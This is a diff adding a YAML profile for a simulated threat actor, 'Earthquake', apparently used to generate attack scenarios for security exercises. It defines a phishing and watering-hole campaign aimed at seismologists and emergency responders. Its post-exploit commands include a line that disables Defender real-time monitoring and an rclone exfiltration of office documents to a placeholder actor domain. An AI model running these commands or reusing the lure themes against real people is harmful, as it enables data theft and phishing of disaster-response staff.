@@ -1,0 +1,78 @@
+name: Earthquake
+effectiveness: 75
+count_init_passive_dns: 10
+max_wave_size: 3
+attacks:
+  - recon:browsing
+  - watering_hole:phishing
+  - watering_hole:malware_delivery
+watering_hole_domains:
+  - earthquakeresearch.org
+watering_hole_target_roles:
+  - Seismologist
+  - Emergency Response Coordinator
+domain_themes:
+  - disaster
+  - emergency
+  - relief
+  - recovery
+  - aid
+  - crisis
+  - response
+  - preparedness
+  - resilience
+sender_themes: 
+  - aid worker
+  - relief coordinator
+  - emergency responder
+  - disaster expert
+  - crisis manager
+subjects:
+  - "Update on earthquake damage assessment"
+  - "Request for emergency assistance"
+  - "Invitation to participate in disaster relief conference"
+  - "Inquiry about donating to earthquake relief efforts"
+  - "Request for seismic data analysis"
+  - "Invitation to join disaster preparedness training"
+  - "Request for assistance in earthquake response planning"
+  - "Confirmation of emergency response coordination meeting"
+  - "Request for earthquake recovery plan overview"
+recon_search_terms:
+  - earthquake fault lines map
+  - disaster relief organizations
+  - earthquake early warning systems
+  - earthquake preparedness training
+  - natural disaster recovery funding
+  - earthquake damage assessment tools
+file_names:
+  - Earthquake-Damage-Assessment-Report.docx
+  - Emergency-Response-Plan.docx
+  - Disaster-Recovery-Plan.docx
+  - Seismic-Data-Analysis-Results.docx
+  - Crisis-Management-Strategy.docx
+  - Disaster-Preparedness-Training-Manual.docx
+  - Emergency-Response-Coordination-Meeting-Minutes.docx
+  - Disaster-Recovery-Funding-Application.docx
+  - Earthquake-Recovery-Plan-Overview.docx
+  - Aid-Donation-Request-Letter.docx
+tlds:
+  - org
+  - gov
+spoofs_email: True
+malware:
+  - aftershock
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
